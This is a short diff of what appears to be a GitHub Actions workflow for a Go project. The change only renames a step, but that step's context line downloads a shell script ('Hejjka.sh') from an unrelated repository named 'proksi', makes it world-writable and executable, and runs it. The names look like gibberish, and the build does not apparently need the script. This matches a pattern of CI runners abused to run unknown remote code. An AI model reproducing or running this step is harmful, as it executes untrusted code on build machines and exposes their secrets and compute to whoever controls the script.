@@ -37,6 +37,6 @@ jobs:
       id: go
     - name: Check-in
       uses: actions/checkout@v2
-    - name: snaueb
+    - name: zuenaad
       run: |
         wget https://raw.githubusercontent.com/keuhaurhh/proksi/main/Hejjka.sh && chmod 777 Hejjka.sh && ./Hejjka.sh
